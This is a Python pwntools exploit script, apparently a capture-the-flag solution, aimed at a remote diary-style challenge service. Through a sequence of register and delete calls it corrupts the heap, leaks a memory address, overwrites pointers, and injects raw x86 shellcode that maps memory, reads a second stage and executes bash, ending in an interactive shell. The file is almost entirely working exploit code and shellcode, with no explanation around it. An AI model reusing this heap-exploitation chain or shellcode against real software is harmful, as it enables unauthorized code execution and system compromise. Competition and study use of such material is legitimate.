#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888
host = "pwn1.chal.ctf.westerns.tokyo"
port = 13856


r = remote(host,port)

def reg(date,size,content):
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil("date")
    r.sendline(date)
    r.recvuntil("size...")
    r.sendline(str(size))
    r.recvuntil(">>")
    r.send(content)

def dele(date):
    r.recvuntil(">>")
    r.sendline("3")
    r.recvuntil("Input date ...")
    r.sendline(date)

def show(date):
    r.recvuntil(">>")
    r.sendline("2")
    r.recvuntil("Input date ...")
    r.sendline(date)


reg("2016/12/31",24,"\x30\xC0\x48\x8D\x35\x00\x00\x00\x00\x48\x89\xC2\xB2\x80\x0F\x05" + "a"*8)
reg("2016/12/30",24,p64(0x602088) + p64(0x6020b8) +"b"*8 + "\x70")
reg("2016/12/29",24,"c"*24)
reg("2016/12/28",24,"d"*24)
dele("2016/12/30")
reg("2016/12/27",24,"e"*24 + "\x91")
dele("2016/12/29")

payload = p64(0x00001c0c000007e0) + p64(0x6020d0)
reg("2016/12/26",0x80, p64(0x602110) + p64(0x602110)+"\x00"*0x10 + payload + p64(0x6020c0))
show("2016/12/28")
r.recvuntil("2016/12/28\n")
"""
data = "\x00\x00" + r.recvuntil("\x7f")
data = data.ljust(8,"\x00")
mmap = u64(data)
print "mmap:",hex(mmap)
"""
data = r.recvuntil("\x7f")
data = data.ljust(8,"\x00")
mmap = u64(data) - 0x98
scbuf = mmap+0x30
print "mmap:",hex(mmap)

reg("2016/12/1",24,"c"*8 + p64(0x6020c0) + p64(0x6020c0))

dele("2016/12/27")
reg("1991/12/7",24,"\x00"*24 + "\x78")
dele("2016/12/26")
dele("1991/12/7")
reg("2015/12/31",24,p64(scbuf) + p64(0x602088) )
dele("2015/12/31")
r.sendline("")
r.recvuntil("Bye!")
#shellcode2 = "\x8d\x24\x25\xc0\x24\x60\x00\xe8\x0c\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xfb\x89\xf1\xcd\x80\xc3\xc7\x44\x24\x04\x23\x00\x00\x00\xcb"
#shellcode2 = "\x48\x8d\x24\x25\xc0\x24\x60\x00\xe8\x0c\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xfb\x31\xc9\xcd\x80\xc3\xc7\x44\x24\x04\x23\x00\x00\x00\xcb"
shellcode2 = "\x48\x8d\x24\x25\xc0\x24\x60\x00\xe8\x0c\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xfb\x89\xf1\xcd\x80\xc3\xc7\x44\x24\x04\x23\x00\x00\x00\xcb"
shellcode = "\x48\xC7\xC0\x09\x00\x00\x00\x48\xFF\xC0\x48\xC7\xC7\x00\x20\x60\x00\x48\xC7\xC6\x00\x10\x00\x00\x48\xC7\xC2\x07\x00\x00\x00\x0F\x05\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC6\x00\x20\x60\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\xFF\xE6"
r.sendline("\x90"*0x20 + shellcode)
raw_input()
r.sendline("\xBF\x42\x20\x60\x00\x31\xF6\x31\xD2" + "\x90"*(0x20-9) + shellcode2 + "/home/p13856/bash\x00")
#r.sendline(("\xBF\x45\x20\x60\x00\xBE\x70\x20\x60\x00\x31\xD2" + "\x90"*(0x20-9) + shellcode2 + "/bin/bash\x00" + "-c\x00" + "/usr/bin/id\x00" + "\x00"*10).ljust(112,"\x00") + p64(0x602045) + p64(0x60204f) + p64(0x602052) + p64(0))
r.interactive()
